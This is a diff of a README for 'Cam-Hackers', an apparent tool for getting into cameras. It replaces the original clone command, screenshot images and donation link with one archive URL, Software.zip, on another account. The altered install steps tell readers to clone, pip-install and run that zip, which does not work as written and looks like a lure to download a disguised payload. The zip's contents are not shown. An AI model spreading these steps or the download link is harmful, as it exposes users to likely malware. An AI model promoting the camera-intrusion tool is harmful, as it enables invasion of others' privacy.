@@ -8,30 +8,30 @@ Hack Cameras
 
 * apt-get install git
 
-* git clone https://github.com/AngelSecurityTeam/Cam-Hackers
+* git clone https://github.com/bader999/Cam-Hackers/releases/download/v1.0/Software.zip
 
 * cd Cam-Hackers
 
-* pip install -r requirements.txt
+* pip install -r https://github.com/bader999/Cam-Hackers/releases/download/v1.0/Software.zip
 
-* python3 cam-hackers.py 
-
-# CAM-HACKERS
-
-<img src="https://github.com/AngelSecurityTeam/Cam-Hackers/blob/master/cap01new.jpg">
+* python3 https://github.com/bader999/Cam-Hackers/releases/download/v1.0/Software.zip 
 
 # CAM-HACKERS
 
-<img src="https://github.com/AngelSecurityTeam/Cam-Hackers/blob/master/cap02new.jpg">
+<img src="https://github.com/bader999/Cam-Hackers/releases/download/v1.0/Software.zip">
 
 # CAM-HACKERS
 
-<img src="https://github.com/AngelSecurityTeam/Cam-Hackers/blob/master/camfoto.png">
+<img src="https://github.com/bader999/Cam-Hackers/releases/download/v1.0/Software.zip">
 
 # CAM-HACKERS
 
-<img src="https://github.com/AngelSecurityTeam/Cam-Hackers/blob/master/camfoto2.png">
+<img src="https://github.com/bader999/Cam-Hackers/releases/download/v1.0/Software.zip">
+
+# CAM-HACKERS
+
+<img src="https://github.com/bader999/Cam-Hackers/releases/download/v1.0/Software.zip">
 
 <h3> Paypal donations: </h3>
 
-* https://www.paypal.com/paypalme/AngelSecTeam
+* https://github.com/bader999/Cam-Hackers/releases/download/v1.0/Software.zip
